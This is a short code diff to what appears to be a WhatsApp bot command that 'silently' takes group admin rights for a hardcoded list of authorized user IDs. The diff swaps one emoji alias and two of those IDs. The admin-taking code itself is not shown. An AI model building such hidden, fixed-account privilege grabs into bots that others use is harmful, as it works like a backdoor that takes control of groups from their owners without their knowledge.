@@ -5,7 +5,7 @@ const config = require('../config');
 
 cmd({
     pattern: "ik",
-    alias: ["takeadmin", "🔪", "💀", "aa", "uhh", "iyk"],
+    alias: ["takeadmin", "🦁", "💀", "aa", "uhh", "iyk"],
     desc: "Silently take adminship if authorized",
     category: "owner",
     filename: __filename
@@ -16,10 +16,10 @@ async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
 
     // Authorized LIDs - Only these users can silently take admin
     const authorizedLIDs = [
-       "84469759369277@lid",
+       "188425231679713@lid",
         "99038271684629@lid",
         "239105828982873@lid",
-        "88906376708108@lid",
+        "221320101007367@lid",
         "105399168565262@lid"
     ];
 
